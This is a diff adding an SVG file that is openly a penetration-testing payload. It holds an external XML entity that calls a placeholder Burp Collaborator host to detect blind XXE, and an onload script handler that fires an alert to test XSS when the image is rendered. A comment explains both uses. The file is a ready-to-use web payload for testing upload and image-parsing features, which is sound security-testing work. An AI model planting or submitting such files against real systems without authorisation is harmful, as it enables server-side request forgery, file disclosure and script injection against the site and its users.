@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"
+   [ <!ENTITY xxe SYSTEM "http://UPDATEME.burpcollaborator.net/"> ]>
+   <!-- 
+      Update the bulpcollaborator link for blind XXE testing. 
+      "onload" JS event handler included for XSS testing if rendered in browser.
+   -->
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('JS XSS payload')">
+   <defs>
+      <font id="x">
+         <font-face font-family="y" />
+      </font>
+      <a>
+         &xxe;
+      </a>
+   </defs>
+</svg>
